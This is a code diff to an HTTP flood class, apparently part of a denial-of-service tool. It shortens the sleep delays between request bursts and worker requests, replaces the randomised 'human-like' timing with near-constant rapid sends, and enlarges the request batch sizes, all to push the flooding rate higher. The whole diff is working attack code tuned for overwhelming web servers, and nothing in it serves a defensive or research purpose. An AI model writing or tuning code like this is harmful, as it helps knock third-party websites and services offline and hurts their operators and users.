@@ -1444,23 +1444,23 @@ class HttpFlood(Thread):
                                 get_connection, return_connection, rpc)
 
                 if burst_type == "burst":
-                    sleep(base_delay * uniform(0.1, 0.4))
+                    sleep(base_delay * uniform(0.01, 0.05))
                 elif burst_type == "sustained":
-                    sleep(base_delay * uniform(0.3, 0.8))
+                    sleep(base_delay * uniform(0.03, 0.1))
                 elif burst_type == "wave":
-                    sleep(base_delay * uniform(2.0, 5.0))
+                    sleep(base_delay * uniform(0.2, 0.8))
                 else:
-                    sleep(base_delay * uniform(0.3, 1.0))
+                    sleep(base_delay * uniform(0.03, 0.15))
 
                 # ── Follow-up micro-burst ─────────────────────────────
-                for _ in range(max(burst // 3, 5)):
+                for _ in range(max(burst // 2, 5)):
                     pool.submit(self._killer_worker_v3,
                                 get_connection, return_connection, rpc)
 
                 if burst_type == "wave":
-                    sleep(base_delay * uniform(0.5, 1.0))
+                    sleep(base_delay * uniform(0.1, 0.3))
                 else:
-                    sleep(base_delay * uniform(1.5, 4.0))
+                    sleep(base_delay * uniform(0.15, 0.6))
 
     def _killer_worker_v3(self, get_conn, return_conn, rpc: int) -> None:
         from random import uniform, choice as rc, randint
@@ -1480,28 +1480,14 @@ class HttpFlood(Thread):
                     payload = self._killer_build_request(method, path, fp)
                     if not Tools.send(s, payload):
                         break
-                    # ── Super Power: Human-like timing between requests ──
-                    if i == 0:
-                        sleep(uniform(0.05, 0.2))
-                    elif i == 1:
-                        sleep(uniform(0.01, 0.06))
-                    elif i == 2:
-                        sleep(uniform(0.005, 0.04))
-                    else:
-                        sleep(uniform(0.003, 0.02))
+                    sleep(uniform(0.001, 0.005))
             else:
-                batch = min(rpc, randint(5, 15))
+                batch = min(rpc, randint(15, 40))
                 for _ in range(batch):
                     payload = self._killer_payload_v3(fp)
                     if not Tools.send(s, payload):
                         break
-                    # ── Super Power: Variable inter-request timing ──────
-                    if rc([True, False, False]):
-                        sleep(uniform(0.0005, 0.003))
-                    elif rc([True, False]):
-                        sleep(uniform(0.0001, 0.001))
-                    else:
-                        sleep(uniform(0.0005, 0.005))
+                    sleep(uniform(0.0001, 0.0005))
 
             return_conn(s)
         except Exception:
@@ -2466,14 +2452,9 @@ def _killer_process_entry(max_workers, rpc,
                         burst_ctrl.record_failure()
                         break
                     burst_ctrl.record_success()
-                    if i == 0:
-                        sleep(expovariate(1.0 / 0.12))
-                    elif i == 1:
-                        sleep(expovariate(1.0 / 0.03))
-                    else:
-                        sleep(expovariate(1.0 / 0.015))
+                    sleep(uniform(0.001, 0.005))
             else:
-                batch = min(rpc, randint(5, 15))
+                batch = min(rpc, randint(15, 40))
                 for _ in range(batch):
                     method = rc(("GET", "GET", "GET", "POST", "HEAD"))
                     rand_path = _killer_rand_path_fast(_KILLER_PATHS_STANDALONE)
@@ -2529,7 +2510,7 @@ def _killer_process_entry(max_workers, rpc,
                         burst_ctrl.record_failure()
                         break
                     burst_ctrl.record_success()
-                    sleep(expovariate(1.0 / 0.003))
+                    sleep(uniform(0.0001, 0.001))
 
             return_conn(s)
         except Exception:
@@ -2550,11 +2531,11 @@ def _killer_process_entry(max_workers, rpc,
             for _ in range(burst):
                 pool.submit(_worker, get_connection, return_connection,
                             rpc, burst_ctrl, session_cache)
-            sleep(base_delay * uniform(0.3, 1.0))
-            for _ in range(max(burst // 3, 5)):
+            sleep(base_delay * uniform(0.05, 0.2))
+            for _ in range(max(burst // 2, 5)):
                 pool.submit(_worker, get_connection, return_connection,
                             rpc, burst_ctrl, session_cache)
-            sleep(base_delay * uniform(1.5, 4.0))
+            sleep(base_delay * uniform(0.1, 0.5))
             if len(session_cache) > max_workers * 2:
                 session_cache.clear()
 
